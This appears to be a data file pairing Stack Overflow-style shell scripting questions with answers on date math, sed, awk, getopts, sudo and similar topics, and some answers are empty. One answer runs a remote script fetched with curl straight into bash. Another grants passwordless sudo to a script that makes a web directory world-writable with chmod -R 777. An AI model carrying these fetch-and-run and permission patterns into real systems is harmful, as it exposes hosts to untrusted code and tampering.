    "How to get the difference in days between two dates using shell commands?": "Using only date and shell arithmetics:\necho $((($(date -d \"2010-06-01\" \"+%s\") - $(date -d \"2010-05-15\" \"+%s\")) / 86400))",
    "Cannot get ffmpeg to work after installing from homebrew": "I got it to work by running brew search liblzma which told me lzma is now part of the xz formula.\nSo then I ran brew install xz and tried running ffmpeg again and it works now!",
    "Print dates in date range linux": "As long as the dates are in YYYY-MM-DD format, you can compare them lexicographically, and let date do the calendar arithmetic without converting to seconds first:\nstartdate=2013-03-15\nenddate=2013-04-14\n\ncurr=\"$startdate\"\nwhile true; do\n    echo \"$curr\"\n    [ \"$curr\" \\< \"$enddate\" ] || break\n    curr=$( date +%Y-%m-%d --date \"$curr +1 day\" )\ndone\nWith [ ... ], you need to escape the < to avoid confusion with the input redirection operator.\nThis does have the wart of printing the start date if it is greater than the end date.",
    "OSX bash \"sleep\"": "This might be a little late, but it seems that sleep on OS X doesn't work with quantifiers (m,h, ...). Official Apple documentation\nSo \"sleep 5m\" is the same as \"sleep 5\". If you want 5 minutes, you have to use \"sleep 300\"",
    "bash cat multiple files": "cat f1 <(echo) f2 <(echo) f3 <(echo) \nor\nperl -pe 'eof&&s/$/\\n/' a b c",
    "MongoDB remove GridFS objects from shell": "You can delete gridFS file by deleting both chunks and files from shell. for example\ndb['fs.chunks'].remove({files_id:my_id});\ndb['fs.files'].remove({_id:my_id});\nThose commands will do such trick.",
    "How can I get the last number from string in bash?": "All you need is grep -Eo '[0-9]+$' :\ngv@debian:~$ echo 234ef85 |grep -Eo '[0-9]+$'          ## --> 85\ngv@debian:~$ echo 234ef856 |grep -Eo '[0-9]+$'         ## --> 856\ngv@debian:~$ echo 234ef85d6 |grep -Eo '[0-9]+$'        ## --> 6\ngv@debian:~$ echo 234ef85d.6 |grep -Eo '[0-9]+$'       ## --> 6\ngv@debian:~$ echo 234ef85d.6. |grep -Eo '[0-9]+$'      ## --> no result\ngv@debian:~$ echo 234ef85d.6.1 |grep -Eo '[0-9]+$'     ## --> 1\ngv@debian:~$ echo 234ef85d.6.1222 |grep -Eo '[0-9]+$'  ## --> 1222",
    "Parsing XML using unix terminal": "Peter's answer is correct, but it outputs a trailing line feed.\n<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\">\n  <xsl:output method=\"text\"/>\n  <xsl:template match=\"root\">\n    <xsl:for-each select=\"myel\">\n      <xsl:value-of select=\"@name\"/>\n      <xsl:text>,</xsl:text>\n      <xsl:if test=\"not(position() = last())\">\n        <xsl:text>&#xA;</xsl:text>\n      </xsl:if>\n    </xsl:for-each>\n  </xsl:template>\n</xsl:stylesheet>\nJust run e.g.\nxsltproc stylesheet.xsl source.xml\nto generate the CSV results into standard output.",
    "CMake's execute_process and arbitrary shell scripts": "You can execute any shell script, using your shell's support for taking in a script within a string argument.\nExample:\nexecute_process(\n    COMMAND bash \"-c\" \"echo -n hello | sed 's/hello/world/;'\" \n    OUTPUT_VARIABLE FOO\n)\nwill result in FOO containing world.\nOf course, you would need to escape quotes and backslashes with care. Also remember that running bash would only work on platforms which have bash - i.e. it won't work on Windows.",
    "Read lines between two lines specified by their line number": "By row number like that is quite easy with awk:\nawk 'NR >= 23 && NR <= 56'\nAnd either way, sed makes it fun.\nsed '23,56!d'\nOr for a pattern,\nsed '/start/,/end/!d'",
    "How do I check if all files inside directories are valid jpegs (Linux, sh script needed)?": "The short-short version:\nfind . -iname \"*.jpg\" -exec jpeginfo -c {} \\; | grep -E \"WARNING|ERROR\"\nYou might not need the same find options, but jpeginfo was the solution that worked for me:\nfind . -type f -iname \"*.jpg\" -o -iname \"*.jpeg\"| xargs jpeginfo -c | grep -E \"WARNING|ERROR\" | cut -d \" \" -f 1\nas a script (as requested in this question)\n#!/bin/sh\nfind . -type f \\\n\\( -iname \"*.jpg\" \\\n -o -iname \"*.jpeg\" \\) \\\n-exec jpeginfo -c {} \\; | \\\ngrep -E \"WARNING|ERROR\" | \\\ncut -d \" \" -f 1\nI was clued into jpeginfo for this by http://www.commandlinefu.com/commands/view/2352/find-corrupted-jpeg-image-files and this explained mixing find -o OR with -exec",
    "How to create a file with its name starting with dash in Linux? (ex \"-file\")": "In bash -- is a flag that is interpreted as \"nothing after this should be taken as a flag\", so - is no longer parsed as an option.\ntouch -- -file",
    "Trim trailing and leading slash in bash - joining param substitutions?": "Coming to this very late... You can use bash variable substitution. It can remove a leading OR trailing optional slash, but it can't do both at the same time. If we execute:\nVAR1=/one/two/\nVAR2=one/two\necho ${VAR1} ${VAR2}\necho ${VAR1#/} ${VAR2#/}\necho ${VAR1%/} ${VAR2%/}\nthen we get:\n/one/two/ one/two            # No change\none/two/ one/two             # No leading slashes\n/one/two one/two             # No trailing slashes\nAs we can see, slashes inside the variables remain unaltered.\nYou can combine them using an intermediate variable as:\nVAR3=${VAR1#/}               # Remove optional leading slash\nVAR3=${VAR3%/}               # Remove optional trailing slash\necho ${VAR3}",
    "In array operator in bash": "A for loop will do the trick.\narray=(one two three)\n\nfor i in \"${array[@]}\"; do\n  if [[ \"$i\" = \"one\" ]]; then\n    ...\n    break\n  fi\ndone",
    "Bash -- find a list of files with more than 3 lines": "You can use this find command:\nfind . -type f -exec bash -c '[[ $(wc -l < \"$1\") -gt 2 ]] && echo \"$1\"' _ '{}' \\;",
    "Command not found error message when running script": "Make it executable:\nchmod +x ./test\nand make sure you save your file in Unix file format. And: check if your partition is executable (mount).",
    "Shell: simple way to get all lines before first blank line": "sed -e '/^$/,$d' <<EOF\nthis is text\nso is this\n\nbut not this\nor this\nEOF",
    "\"Git Bash here\" is not preserving bash history between sessions [duplicate]": "You should be able to fix this by adding this line to your ~/.bash_profile\nPROMPT_COMMAND='history -a'",
    "Command not found when comparing string": "I'm sure this has come up before, but -- [ is actually a command. You need a space after the [ in order for the shell to find it.",
    "While using printf how to escape special characters in shell script?": "Try\nprintf \"%s\\n\" \"$string\"\nSee printf(1)",
    "Shell: find files in a list under a directory": "If filelist.txt has a single filename per line:\nfind /dir | grep -f <(sed 's@^@/@; s/$/$/; s/\\([\\.[\\*]\\|\\]\\)/\\\\\\1/g' filelist.txt)\n(The -f option means that grep searches for all the patterns in the given file.)\nExplanation of <(sed 's@^@/@; s/$/$/; s/\\([\\.[\\*]\\|\\]\\)/\\\\\\1/g' filelist.txt):\nThe <( ... ) is called a process subsitution, and is a little similar to $( ... ). The situation is equivalent to (but using the process substitution is neater and possibly a little faster):\nsed 's@^@/@; s/$/$/; s/\\([\\.[\\*]\\|\\]\\)/\\\\\\1/g' filelist.txt > processed_filelist.txt\nfind /dir | grep -f processed_filelist.txt\nThe call to sed runs the commands s@^@/@, s/$/$/ and s/\\([\\.[\\*]\\|\\]\\)/\\\\\\1/g on each line of filelist.txt and prints them out. These commands convert the filenames into a format that will work better with grep.\ns@^@/@ means put a / at the before each filename. (The ^ means \"start of line\" in a regex)\ns/$/$/ means put a $ at the end of each filename. (The first $ means \"end of line\", the second is just a literal $ which is then interpreted by grep to mean \"end of line\").\nThe combination of these two rules means that grep will only look for matches like .../<filename>, so that a.txt doesn't match ./a.txt.backup or ./abba.txt.\ns/\\([\\.[\\*]\\|\\]\\)/\\\\\\1/g puts a \\ before each occurrence of . [ ] or *. Grep uses regexes and those characters are considered special, but we want them to be plain so we need to escape them (if we didn't escape them, then a file name like a.txt would match files like abtxt).\nAs an example:\n$ cat filelist.txt\nfile1.txt\nfile2.txt\nblah[2012].txt\nblah[2011].txt\nlastfile\n\n$ sed 's@^@/@; s/$/$/; s/\\([\\.[\\*]\\|\\]\\)/\\\\\\1/g' filelist.txt\n/file1\\.txt$\n/file2\\.txt$\n/blah\\[2012\\]\\.txt$\n/blah\\[2011\\]\\.txt$\n/lastfile$\nGrep then uses each line of that output as a pattern when it is searching the output of find.",
    "How to match until the last occurrence of a character in bash shell": "This removes everything from the last - to the end:\nsed 's/\\(.*\\)-.*/\\1/'\nAs examples:\n$ echo HIX_MAIN-7ae52 | sed 's/\\(.*\\)-.*/\\1/'\nHIX_MAIN\n$ echo HIX-R1-1-3b5126629f67 | sed 's/\\(.*\\)-.*/\\1/'\nHIX-R1-1\nHow it works\nThe sed substitute command has the form s/old/new/ where old is a regular expression. In this case, the regex is \\(.*\\)-.*. This works because \\(.*\\)- is greedy: it will match everything up to the last -. Because of the escaped parens,\\(...\\), everything before the last - will be saved in group 1 which we can refer to as \\1. The final .* matches everything after the last -. Thus, as long as the line contains a -, this regex matches the whole line and the substitute command replaces the whole line with \\1.",
    "Empty Body For Loop Linux Shell": "You must specify at least one command in a loop body.\nThe best command for such a purposes is a colon :, commonly used as a no-op shell command.",
    "How to read entire line from bash": "while read -r line; do echo \"$line\"; done < file.txt",
    "Using compound conditions in a Bash shell script": "For numeric comparison, you can do:\nif ! (( (a == b) && (a == c) ))\nFor string comparison:\nif ! [[ \"$a\" == \"$b\" && \"$a\" == \"$c\" ]]\nIn Bash, the double parentheses set up an arithmetic context (in which dollar signs are mostly optional, by the way) for a comparison (also used in for ((i=0; i<=10; i++)) and $(()) arithmetic expansion) and is used to distinguish the sequence from a set of single parentheses which creates a subshell.\nThis, for example, executes the command true and, since it's always true it does the action:\nif (true); then echo hi; fi \nThis is the same as\nif true; then echo hi; fi\nexcept that a subshell is created. However, if ((true)) tests the value of a variable named \"true\".\nIf you were to include a dollar sign, then \"$true\" would unambiguously be a variable, but the if behavior with single parentheses (or without parentheses) would change.\nif ($true)\nor\nif $true\nwould execute the contents of the variable as a command and execute the conditional action based on the command's exit value (or give a \"command not found\" message if the contents aren't a valid command).\nif (($true)) \ndoes the same thing as if ((true)) as described above.",
    "How to define pwd as a variable in Unix shell": "The current directory is already in a variable, called PWD, and it is automatically set by the shell:\necho \"$PWD\"\nYou could also:\ndir=$(pwd)\necho \"$dir\"\nOr you could use these in your script without storing in additional variables:\n/bin/env/####/ --id --edition-dir \"$PWD\"\n/bin/env/####/ --id --edition-dir \"$(pwd)\"\nFor your information: every time you change directory, whether in an interactive shell or a script, the shell sets the value of the PWD variable to the current directory, and the value of OLDPWD to the previous directory.\nWell, usually. As @WilliamPursell pointed out, OLDPWD is not standard, so it might not be available in all shells.",
    "How to gently kill Firefox process on Linux/OS X": "You can use pkill with the process name:\npkill -f firefox",
    "What color options exist for ack(-grep) for colorization of output, logs, etc?": "ack uses Perl's Term::ANSIColor module, so you can check what is available to you with:\nperldoc Term::ANSIColor\nHere's the relevant excerpt.\n   The recognized normal foreground color attributes (colors 0 to 7) are:\n\n     black  red  green  yellow  blue  magenta  cyan  white\n\n   The corresponding bright foreground color attributes (colors 8 to 15)\n   are:\n\n     bright_black  bright_red      bright_green  bright_yellow\n     bright_blue   bright_magenta  bright_cyan   bright_white\n\n   The recognized normal background color attributes (colors 0 to 7) are:\n\n     on_black  on_red      on_green  on_yellow\n     on_blue   on_magenta  on_cyan   on_white\n\n   The recognized bright background color attributes (colors 8 to 15) are:\n\n     on_bright_black  on_bright_red      on_bright_green  on_bright_yellow\n     on_bright_blue   on_bright_magenta  on_bright_cyan   on_bright_white\n\n   For any of the above listed attributes, case is not significant.\nI'm glad to see you using --passthru, too.\nWe'd welcome you on the ack-users mailing list",
    "How to find dos format files in a linux file system": "How about:\nfind . -name \"*.php\" | xargs file | grep \"CRLF\"\nI don't think it is reliable to try and use ^M to try and find the files.",
    "Bash completion for Maven escapes colon": "From Bash FAQ E13.\nJust after the complete command in the script you linked to, issue this command to remove the colon from the list of completion word break characters:\nCOMP_WORDBREAKS=${COMP_WORDBREAKS//:}",
    "java Runtime.getRunTime().exec & wildcards?": "After a lot of searching I found this: http://www.coderanch.com/t/423573/java/java/Passing-wilcard-Runtime-exec-command\nRuntime.exec(new String[] { \"sh\", \"-c\", \"rm /tmp/ABC*\" });",
    "Can you grep a file using a regular expression and only output the matching part of a line?": "sed is fine without grep:\nsed -n 's/Failed to add \\(.*\\) to database/\\1/p' filename",
    "Could not run adb reverse (React-Native)": "",
    "bash getopts multiple arguments or default value": "You can just provide default value before while loop:\ndirectory=mydir\ndepth=123\nwhile getopts \"hd:l:\" opt; do\n    case $opt in\n        d ) directory=$OPTARG;;\n        l ) depth=$OPTARG;;\n        h ) usage\n        exit 0;;\n        *) usage\n        exit 1;;\n    esac\ndone\necho \"<$directory> <$depth>\"",
    "Bash shell read error: 0: Resource temporarily unavailable": "Usually it is important to know what input the invoked program expects and from where, so it is not a problem to redirect stdin from /dev/null for those that shouldn't be getting any.\nStill, it is possible to do it for the shell itself and all invoked programs. Simply move stdin to another file descriptor and open /dev/null in its place. Like this:\nexec 3<&0 0</dev/null\nThe above duplicates stdin file descriptor (0) under file descriptor 3 and then opens /dev/null to replace it.\nAfter this any invoked command attempting to read stdin will be reading from /dev/null. Programs that should read original stdin should have redirection from file descriptor 3. Like this:\nread -r var 0<&3\nThe < redirection operator assumes destination file descriptor 0, if it is omitted, so the above two commands could be written as such:\nexec 3<&0 </dev/null\nread -r var <&3",
    "How to get the exit status a loop in bash": "The status of the loop is the status of the last command that executes. You can use break to break out of the loop, but if the break is successful, then the status of the loop will be 0. However, you can use a subshell and exit instead of breaking. In other words:\nfor i in foo bar; do echo $i; false; break; done; echo $?  # The loop succeeds\n( for i in foo bar; do echo $i; false; exit; done ); echo $? # The loop fails\nYou could also put the loop in a function and return a value from it. eg:\nin() { local c=\"$1\"; shift; for i; do test \"$i\" = \"$c\" && return 0; done; return 1; }",
    "Executing Maven task from shell script and getting error codes": "result_code=mvn deploy is not the way to get return status\nyou can try e.g. :\n#!/bin/bash\nmvn deploy\nSTATUS=$?\nif [ $STATUS -eq 0 ]; then\necho \"Deployment Successful\"\nelse\necho \"Deployment Failed\"\nfi",
    "Emulate Force Stop from ADB/Shell Commands": "",
    "Opening an explorer window with designated file selected": "Here you go,\nstring fileToSelect = @\"C:\\temp.img\";\nstring args = string.Format(\"/Select, \\\"{0}\\\"\", fileToSelect);\n\nProcessStartInfo pfi = new ProcessStartInfo(\"Explorer.exe\", args);\nSystem.Diagnostics.Process.Start(pfi);\nNote: Adding \\\" before and after the {0} parameter enables the fileToSelect string to contain spaces (i.e. \"C:\\My Documents\").\nFrom this Thread:\nProgrammatically select multiple files in windows explorer\nCheers,",
    "Converting a Shell Script Into a *.app File": "Just to mention it, if you Get Info on a script, you can set it to be opened with the Terminal. This will run the script when you double-click it.\nOtherwise, packaging a script in a .app bundle is trivial. Mac OS X will happily run any script identified as the application's executable.\nAt a minimum, you need to following structure in place:\n(name).app\nContents\nMacOS\n(name)\nWhere the file called (name) is your script (which must be executable, and must have a shebang line). (name) must be identical in the .app directory and the script file: for instance, if your app directory is called \"My Shell Script.app\", then the file inside the MacOS directory must be called \"My Shell Script\", with no extension.\nIf this is inconvenient, it's possible to use an Info.plist file to specify an alternate executable name. The Info.plist goes in the Contents directory:\nWrapper.app\nContents\nInfo.plist\nMacOS\nMyScript\nThis structure (a MyScript executable in a wrapper called Wrapper.app) works if you specify MyScript as the CFBundleExecutable in the property list:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>CFBundleExecutable</key>\n    <string>MyScript</string>\n</dict>\n</plist>\nUsing an Info.plist file is probably preferable, as that will allow you to rename your wrapper without breaking it.\nHere's one example script that uses /bin/sh as the interpreter, but you really could have anything (#!/usr/bin/swift, #!/usr/bin/python, etc).\n#!/bin/sh\nopen -a Calculator\nThe script will run as you double-click the app bundle.\nYou can bundle anything else that you need with your script within the Contents directory. If you feel fancy, you can reproduce the standard executable bundle layout with a Resources directory and things like that.",
    "bash removing part of a file name": "rename is part of the perl package. It renames files according to perl-style regular expressions. To remove the dates from your file names:\nrename 's/[0-9]{14}//' CombinedReports_LLL-*.csv\nIf rename is not available, sed+shell can be used:\nfor fname in Combined*.csv ; do mv \"$fname\" \"$(echo \"$fname\" | sed -r 's/[0-9]{14}//')\" ; done\nThe above loops over each of your files. For each file, it performs a mv command: mv \"$fname\" \"$(echo \"$fname\" | sed -r 's/[0-9]{14}//')\" where, in this case, sed is able to use the same regular expression as the rename command above. s/[0-9]{14}// tells sed to look for 14 digits in a row and replace them with an empty string.",
    "Convert command line arguments to regular expression": "Use re.escape() to make sure input text is treated as literal text in a regular expression:\npattern = re.compile(re.escape(motif))\nDemo:\n>>> import re\n>>> motif = r\"\\section\"\n>>> txt = r\"abcd\\sectiondefghi\"\n>>> pattern = re.compile(re.escape(motif))\n>>> txt = r\"abcd\\sectiondefghi\"\n>>> print pattern.findall(txt)\n['\\\\section']\nre.escape() escapes all non-alphanumerics; adding a backslash in front of each such a character:\n>>> re.escape(motif)\n'\\\\\\\\section'\n>>> re.escape('\\n [hello world!]')\n'\\\\\\n\\\\ \\\\[hello\\\\ world\\\\!\\\\]'",
    "How to repeat a dash (hyphen) in shell": "This throws an error:\n$ printf '-%.0s' {1..100}; echo \"\"\nbash: printf: -%: invalid option\nprintf: usage: printf [-v var] format [arguments]\nThis works fine under bash:\n$ printf -- '-%.0s' {1..100}; echo \"\"\n----------------------------------------------------------------------------------------------------\nFor other shells, try:\nprintf -- '-%.0s' $(seq 100); echo \"\"\nThe problem was the printf expects that - starts an option. As is common among Unix/POSIX utilities in this type of situation, -- signals to printf to expect no more options.",
    "How to use SED without a file with an env var?": "This might work for you:\na='aoeua'\nsed 's@a@o@g' <<<$a\nooeuo\n<<<$a is a here-string",
    "How do I run a shell script as root (sudo)?": "I was searching around and found this useful solution:\nEdit your sudoers file to allow running certain commands without a password.\nIt's best to split your post-commit script into two parts, one of which will be run through sudo.\nentry in /etc/sudoers:\nloqman    ALL=(root) NOPASSWD: /usr/local/bin/svn-postcommit-export\nYour post-commit hook:\n#!/bin/sh\nsudo /usr/local/bin/svn-postcommit-export\nScript /usr/local/bin/svn-postcommit-export:\n#!/bin/sh\nsvn export --force file:///home/repository/trunk/ /home/memarexweb/public_html/devel/\nchmod -R 777 /home/memarexweb/public_html/devel/\n(You can choose any name and put the script anywhere; I just suggested svn-postcommit-export as an example, and /usr/local/bin as a common location.)",
    "How to add a user to a group without logout/login - Bash script": "Use the newgrp command to login to a new group.\nThe way newgrp works is that it changes the group identification of its caller, analogously to login. The same person remains logged in, and the current directory is unchanged, but calculations of access permissions to files are performed with respect to the new group ID.\nSo for your case, you\u2019ll use:\n# usermod -aG docker user\n# newgrp docker\nCheck your new primary group, it should be docker:\n$ id -g\n989\nConfirm from /etc/group\n$ cat /etc/group | grep `id -g`\ndocker:x:989:jmutai\nThis should do the trick.",
    "How do I install Fish Shell on AWS Linux [closed]": "",
    "Run shell script from python with permissions": "sounds like you need to give your ssh command a public or private key it can access perhaps:\nssh -i /backup/home/user/.ssh/id_dsa user@unixserver1.nixcraft.com\n-i tells it where to look for the key",
    "Import PGP public key by string": "gpg --import knows two ways of operation: it can either read from a file (for example gpg --import key.gpg) or -- if no file name is passed -- read from STDIN. curl on the other hand will print the fetched document to STDOUT if no -o parameter is given. Putting both together with a pipe will directly stream the results from curl into gpg --import:\ncurl http://example.com/pgp-public-key | gpg --import",
    "How do you clone ( duplicate ) a MongoDB object in a collection of the same db?": "Code\n> user = db.users.findOne({'nickname': 'user1'})\n> user.nickname = 'userX'\n> delete user['_id']\n> db.users.insert(user)\nDescription\nYou need to find user object and put it into the variable. Than you need to modify the property you want and than you need to insert the whole object as new one. To achieve that you need to delete _id property that the object already has. And than just use insert to create the new one.",
    "Seething over MSYS shell - is it replaceable?": "If you're after a better terminal emulator, I've had success with http://sourceforge.net/projects/console/\nIt's a replacement for the standard windows command window. You can set MSYS or Cygwin, or whatever you want as the shell backing it.",
    "Execute Bash script remotely via cURL": "With the curl ... | bash form, bash's stdin is reading the script, so stdin is not available for the read command.\nTry using a Process Substitution to invoke the remote script like a local file:\nbash <( curl -s ... )",
    "a2ensite 'Site: ___ does not exist' error, even with .conf file": "The answer, in short, is that a2ensite just wants the name of the site.conf and not the whole path to the file.\nSo sudo a2ensite example-com-80.conf\nI found this in an earlier answer by @raina77ow.",
    "How to fix wget download file name when the url is redirected [closed]": "Try the following command:\nwget --content-disposition http://www.mysql.com/get/Downloads/MySQL-5.5/mysql-5.5.25a-linux2.6-x86_64.tar.gz/from/http://cdn.mysql.com/\nWhen this is set to on, the experimental (not fully-functional) support for \"Content-Disposition\" header is enabled. This can result in extra round-trips to the server for a \"HEAD\" request and is known to suffer from a few bugs, which is why it is not currently enabled by default.\nThis option is useful for some file-downloading CGI programs that use \"Content-Disposition\" header to describe what the name of a downloaded file should be.",
    "Find out if file has changed": "Michael, by \"changed\", are you asking if the file has been touched (i.e. datestamp is newer), or are you asking if the content is different?\nIf the former, you can test this with find or test. For example, in shell:\n#!/bin/sh\ntouch file1\nsleep 1\ntouch file2\nif [ \"file1\" -nt \"file2\" ]; then\n  echo \"This will never be seen.\"\nelse\n  echo \"Sure enough, file1 is older.\"\nfi\nIf what you're looking for is a test of the contents, then your operating system probably includes something that will test the hash of a file.\n[ghoti@pc ~]$ date > testfile\n[ghoti@pc ~]$ md5 testfile\nMD5 (testfile) = 1b2faf8be02641f37e6d87b15444417d\n[ghoti@pc ~]$ cksum testfile\n3778116869 29 testfile\n[ghoti@pc ~]$ sha1 testfile \nSHA1 (testfile) = 5f4076a3828bc23a050be4867549996180c2a09a\n[ghoti@pc ~]$ sha256 testfile\nSHA256 (testfile) = f083afc28880319bc31417c08344d6160356d0f449f572e78b343772dcaa72aa\n[ghoti@pc ~]$ \nI'm in FreeBSD. If you're in Linux, then you probably have \"md5sum\" instead of \"md5\".\nTo put this into a script, you'd need to walk through your list of files, store their hashes, then have a mechanism to test current files against their stored hashes. This is easy enough to script:\n[ghoti@pc ~]$ find /bin -type f -exec md5 {} \\; > /tmp/md5list\n[ghoti@pc ~]$ head -5 /tmp/md5list\nMD5 (/bin/uuidgen) = 5aa7621056ee5e7f1fe26d8abb750e7a\nMD5 (/bin/pax) = 7baf4514814f79c1ff6e5195daadc1fe\nMD5 (/bin/cat) = f1401b32ed46802735769ec99963a322\nMD5 (/bin/echo) = 5a06125f527c7896806fc3e1f6f9f334\nMD5 (/bin/rcp) = 84d96f7e196c10692d5598a06968b0a5\nYou can store this (instead of /bin run it against whatever's important, perhaps /) in a predictable location, then write a quick script to check a file against the hash:\n#!/bin/sh\n\nsumfile=/tmp/md5list\n\nif [ -z \"$1\" -o ! -f \"$1\" ]; then\n  echo \"I need a file.\"\n  exit 1\nelif ! grep -q \"($1)\" $sumfile; then\n  echo \"ERROR: Unknown file: $1.\"\n  exit 1\nfi\n\nnewsum=\"`md5 $1`\"\n\nif grep -q \"$newsum\" $sumfile; then\n  echo \"$1 matches\"\nelse\n  echo \"$1 IS MODIFIED\"\nfi\nThis kind of script is what tools like tripwire provide.",
    "How to get the pid of command running with sudo": "You can use $! to get the pid of the last background process (which will be the sudo in this case), and ps --ppid to find out about its children. So for example:\n$ sudo tcpdump -i eth0 port 80 -w eth0.pcap &\n$ ps --ppid $! -o pid=\n16772\n$ ps --pid 16772\n  PID TTY          TIME CMD\n16772 pts/3    00:00:00 tcpdump\nIf you're doing this in a script, you might want to use a sleep 1 between the sudo and ps to ensure that the child gets started.\nNote that if you really must use the -b flag to sudo, this won't work, as that will cause sudo to do an extra fork and immediately exit, losing the connection between child and parent (the tcpdump command will get reparented to init), which means you'll have no easy way of distinguishing the child from any other similar command.",
    "In bash shell script how do I convert a string to an number [duplicate]": "you can use bc\n$ echo \"0.8 > 0.7\" | bc\n1\n$ echo \"0.8 < 0.7\" | bc\n0\n$ echo \".08 > 0.7\" | bc\n0\ntherefore you can check for 0 or 1 in your script.",
    "How to print the line number where a string appears in a file?": "Using grep\nTo look for word in file and print the line number, use the -n option to grep:\ngrep -n 'word' file\nThis prints both the line number and the line on which it matches.\nUsing awk\nThis will print the number of line on which the word word appears in the file:\nawk '/word/{print NR}' file\nThis will print both the line number and the line on which word appears:\nawk '/word/{print NR, $0}' file\nYou can replace word with any regular expression that you like.\nHow it works:\n/word/\nThis selects lines containing word.\n{print NR}\nFor the selected lines, this prints the line number (NR means Number of the Record). You can change this to print any information that you are interested in. Thus, {print NR, $0} would print the line number followed by the line itself, $0.\nAssigning the line number to a variable\nUse command substitution:\nn=$(awk '/word/{print NR}' file)\nUsing shell variables as the pattern\nSuppose that the regex that we are looking for is in the shell variable url:\nawk -v x=\"$url\" '$0~x {print NR}' file\nAnd:\nn=$(awk -v x=\"$url\" '$0~x {print NR}' file)",
    "get \"ERROR: Can't get master address from ZooKeeper; znode data == null\" when using Hbase shell": "If you just want to run HBase without going into Zookeeper management for standalone HBase, then remove all the property blocks from hbase-site.xml except the property block named hbase.rootdir.\nNow run /bin/start-hbase.sh. HBase comes with its own Zookeeper, which gets started when you run /bin/start-hbase.sh, which will suffice if you are trying to get around things for the first time. Later you can put distributed mode configurations for Zookeeper.\nYou only need to run /sbin/start-dfs.sh for running HBase since the value of hbase.rootdir is set to hdfs://127.0.0.1:9000/hbase in your hbase-site.xml. If you change it to some location on local the filesystem using file:///some_location_on_local_filesystem, then you don't even need to run /sbin/start-dfs.sh.\nhdfs://127.0.0.1:9000/hbase says it's a place on HDFS and /sbin/start-dfs.sh starts namenode and datanode which provides underlying API to access the HDFS file system. For knowing about Yarn, please look at http://hadoop.apache.org/docs/r2.3.0/hadoop-yarn/hadoop-yarn-site/YARN.html.",
    "\"Event not found\" error for shell command in unix [duplicate]": "You're invoking the shell's history substitution. Surround the exclamation point with single quotes.",
    "How to prevent PuTTY shell from auto-exit after executing command from batch file in Windows?": "The SSH session closes (and PuTTY with it) as soon as the command finishes. Normally the \"command\" is shell. As you have overridden this default \"command\" and yet you want to run the shell nevertheless, you have to explicitly execute the shell yourself:\navahi-daemon ... ; /bin/bash\nAlso as use of -m switch implies a non-interactive terminal, you probably want to force an interactive terminal back using -t switch.\nThough, I'm not really sure if you want to execute shell or if you just want to see your command output. If the latter, did you consider using plink? It's console terminal client from PuTTY package. Being console application, it inherits console of parent batch file, and you can pause the batch console from closing using pause command, if needed.\nAnother option (both for PuTTY and plink) is to pause on remote side. E.g. Using read command.\navahi-daemon ... ; read",
    "trap not working in shell script?": "The bash manual states that:\nIf bash is waiting for a command to complete and receives a signal for which a trap has been set, the trap will not be executed until the command completes.\nAs gniourf_gniourf says, this is a POSIX spec relative to signals in shells.\nYou can check it by trapping for instance SIGUSR1 in place of SIGTERM; you'll see that kill -TERM will kill again the process.\nA solution is to run the command in background, then wait for its termination. In this case the trap will work. Try this:\n#! /bin/bash\n\nshutdown()\n{\n    touch foo.txt\n    exit 0\n}\n\ntrap shutdown TERM\nsu -l myusername -c \"sleep 9999\" &    # On Ubuntu: sudo su\nwait\nYou will get two problems: su won't be able to ask password in foreground; you will have to manually kill su.",
    "setting gsettings of other user with sudo": "After trying a lot of stuff in different combinations this is the only command that worked for me:\nsudo -H -u <user> DISPLAY=:0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/<uid>/bus gsettings set...\nIn a bash script you can use the following function to automatically detect the user and environment of a current session:\nfunction run-in-user-session() {\n    _display_id=\":$(find /tmp/.X11-unix/* | sed 's#/tmp/.X11-unix/X##' | head -n 1)\"\n    _username=$(who | grep \"\\(${_display_id}\\)\" | awk '{print $1}')\n    _user_id=$(id -u \"$_username\")\n    _environment=(\"DISPLAY=$_display_id\" \"DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$_user_id/bus\")\n    sudo -Hu \"$_username\" env \"${_environment[@]}\" \"$@\"\n}\nUse it like this:\nrun-in-user-session gsettings set...",
    "Bash script to convert a string with space delimited tokens to an array": "It's simple actually:\nlist=( $STRING )\nOr more verbosely:\ndeclare -a list=( $STRING )\nPS: You can't export IFS and use the new value in the same command. You have to declare it first, then use its effects in the following command:\n$ list=( first second third )\n$ IFS=\":\" echo \"${list[*]}\"\nfirst second third\n$ IFS=\":\" ; echo \"${list[*]}\"\nfirst:second:third\nNotice that the last example will change IFS to \":\" until you change it again, or the shell exits. Usually you want to use a subshell, or save the original value of IFS so you can restore it afterwards.",
    "remove double extensions in bash": "Assuming:\nYou only want to perform this in the current working directory (non-recursively)\nThe double extensions have format precisely as .jpg.jpg:\nThen the following script will work:\n#!/bin/bash\n\nfor file in *.jpg.jpg\ndo\n    mv \"${file}\" \"${file%.jpg}\"\ndone\nExplanation:\n${file%.jpg}: This part is called Parameter Subsitution.\nFrom the same source: \"${var%Pattern} Remove from $var the shortest part of $Pattern that matches the back end of $var.\"\nNote that the \"pattern\" mentioned here is called globbing, which is different from regular expression in important ways.\nTo use this script:\nCreate a new file called clean_de.sh in that directory\nSet it to executable by chmod +x clean_de.sh\nThen run it by ./clean_de.sh\nA Note of Warning:\nAs @gniourf_gniourf have pointed out, use the -n option if your mv supports it.\nOtherwise - if you have a.jpg and a.jpg.jpg in the same directory, it will rename a.jpg.jpg to a.jpg and in the process override the already existing a.jpg without warning.",
    "Handling input confirmations in Linux shell scripting": "yes | ./script will answer y for everything.\nOtherwise, write a script that prints the answers you want, eg:\n echo N\n echo Y\n echo Y",
